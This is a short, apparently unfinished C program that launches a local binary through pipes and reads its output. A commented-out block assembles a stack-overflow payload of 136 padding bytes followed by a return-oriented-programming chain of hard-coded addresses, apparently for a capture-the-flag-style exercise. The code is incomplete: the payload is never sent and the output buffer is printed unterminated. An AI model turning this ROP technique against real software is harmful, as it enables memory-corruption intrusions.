#include <string.h>
#include <unistd.h>
#include <stdio.h>

int main(void)
{
    char *const argv[] = {"/home/loona/Documents/a.out", NULL};

    int readPipe[2];
    int writePipe[2];
    char buff[300];
    char inbuf[100];

    pipe(readPipe);
    pipe(writePipe);

    if (!fork()) {
        dup2(writePipe[0], STDIN_FILENO);
        dup2(readPipe[1], STDOUT_FILENO);
        execv("/home/loona/Documents/a.out", argv);
    }


    char* text = "ggg";
    read(readPipe[0], inbuf, 100);
    printf("%s %s",inbuf, "<-");

   /* memset(buff, 'A', 136);

    unsigned long *rop = (unsigned long *) (buff + 136);

    *rop ++= 0x04011E3;
    *rop ++= 0x0404018;
    *rop ++= 0x0401030;
    *rop ++= 0x040114d;

    */
}
